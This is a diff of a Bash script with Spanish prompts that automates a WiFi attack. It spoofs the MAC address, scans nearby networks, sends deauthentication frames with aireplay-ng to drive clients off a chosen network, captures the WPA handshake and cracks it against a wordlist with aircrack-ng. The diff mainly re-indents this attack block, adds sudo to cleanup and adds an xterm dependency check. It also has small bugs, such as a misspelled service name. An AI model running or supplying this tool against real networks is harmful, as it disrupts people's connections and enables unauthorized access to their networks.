@@ -49,37 +49,38 @@ if [ $airtest -eq 0 ]; then
 			airmon-ng check kill > /dev/null 2>&1
 			echo -e "\n${yellowColour}[*] Nueva dirección MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
 			echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!"
-		read -p "Quieres hacer un ataque? [Y/N]: " rps
-			if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
-				xterm -hold -e "airodump-ng ${tar}mon" &
-				airodump_xterm_PID=$!
-				read -p "Que red deseas atacar?: " ap
-				read -p "En que canal esta ${ap}}?: " channel
-
-				kill -9 $airodump_xterm_PID
-				wait $airodump_xterm_PID 2>/dev/null
-
-				xterm -hold -e "airodump-ng -c $channel -w Handshake -essid $ap ${tar}mon" &
-				airodump_filter_xterm_PID=$?
-
-				sleep 5; xterm -hold -e "aireplay-ng -0 12 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &
-				aireplay_xterm_PID=$!
-				sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
-
-				sleep 10; kill -9 $airodump_filter_xterm_PID
-				wait $airodump_filter_xterm_PID 2>/dev/null
-
-				read -p "Ruta del diccionario al usar: " dicc
-				xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap" &
-				
-				echo -e "$blueColour"
-				echo -e "\nSe ha terminado el ataque a la red\n"
+			read -p "Quieres hacer un ataque? [Y/N]: " rps
 				$cleancolor
-				airmon-ng stop ${tar}mon > /dev/null 2>&1
-				service NetworkManager start > /dev/null 2>&1
-				service wpa_suppclicant start > /dev/null 2>&1
-				break
-			fi
+				if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
+					xterm -hold -e "airodump-ng ${tar}mon" &
+					airodump_xterm_PID=$!
+					read -p "Que red deseas atacar?: " ap
+					read -p "En que canal esta ${ap}}?: " channel
+
+					kill -9 $airodump_xterm_PID
+					wait $airodump_xterm_PID 2>/dev/null
+
+					xterm -hold -e "airodump-ng -c $channel -w Handshake -essid $ap ${tar}mon" &
+					airodump_filter_xterm_PID=$?
+
+					sleep 5; xterm -hold -e "aireplay-ng -0 12 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &
+					aireplay_xterm_PID=$!
+					sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
+
+					sleep 10; kill -9 $airodump_filter_xterm_PID
+					wait $airodump_filter_xterm_PID 2>/dev/null
+
+					read -p "Ruta del diccionario al usar: " dicc
+					xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap" &
+					
+					echo -e "$blueColour"
+					echo -e "\nSe ha terminado el ataque a la red\n"
+					$cleancolor
+					sudo airmon-ng stop ${tar}mon > /dev/null 2>&1
+					sudo service NetworkManager start > /dev/null 2>&1
+					sudo service wpa_suppclicant start > /dev/null 2>&1
+					break
+				fi
 			if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
 				echo -e "${redColour}\n[*] Saliendo"
 				$cleancolor
@@ -88,11 +89,11 @@ if [ $airtest -eq 0 ]; then
 else
 	tool_name="aircrack-ng"
 	tool_name2="macchanger"
+	tool_name3="xterm"
 
 	if ! command -v $tool_name > /dev/null 2>&1; then
-	echo -e "\n[*] Instalando aircrack y xterm, luego ejecute de nuevo la herramienta"
+	echo -e "\n[*] Instalando aircrack-ng, luego ejecute de nuevo la herramienta"
 	sudo apt-get install $tool_name -y > /dev/null 2>&1 || {  
-	sudo apt-get install xterm -y > /dev/null 2>&1 	
 		echo "[*] Instalando Dependencias"
 		sudo pacman -S $tool_name || {
 		echo -e "\n$redColour[!] No se pudo instalar $tool_name" >&2
@@ -107,6 +108,17 @@ else
 		echo "[*] Instalando Dependencias"
 		sudo pacman -S $tool_name2 || {
 		echo -e "\n$redColour[!] No se pudo instalar $tool_name2" >&2
+		exit 1
+		}
+	}
+	fi
+
+	if ! command -v $tool_name3 > /dev/null 2>&1; then
+	echo -e "\n[*] Instalando xterm, luego ejecute de nuevo la herramienta"
+	sudo apt-get install $tool_name3 -y > /dev/null 2>&1 || {  
+		echo "[*] Instalando Dependencias"
+		sudo pacman -S $tool_name3 || {
+		echo -e "\n$redColour[!] No se pudo instalar $tool_name3" >&2
 		exit 1
 		}
 	}
